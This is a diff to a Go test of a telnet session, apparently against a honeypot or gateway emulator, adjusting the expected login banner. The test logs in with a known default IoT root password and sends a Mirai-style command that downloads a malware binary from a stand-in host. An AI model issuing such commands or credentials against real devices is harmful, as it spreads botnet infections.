@@ -128,8 +128,9 @@ func TestTelnetSession(t *testing.T) {
 	fmt.Fprint(conn, "root\r\n")
 	readUntil(t, r, "Password: ")
 	fmt.Fprint(conn, "xc3511\r\n")
-	if text := readUntil(t, r, "root@gateway:~# "); !strings.Contains(text, "BusyBox") {
-		t.Errorf("no BusyBox banner after login: %q", text)
+	// Buildroot's BusyBox shell is "quiet": after the password only a new line, then the prompt
+	if text := readUntil(t, r, "root@gateway:~# "); !strings.HasSuffix(text, "\r\nroot@gateway:~# ") || strings.Contains(text, "BusyBox") {
+		t.Errorf("after login: %q (expected no banner)", text)
 	}
 
 	fmt.Fprint(conn, "cd /tmp; wget http://203.0.113.7/bins/mirai.arm7 -O x\r\n")
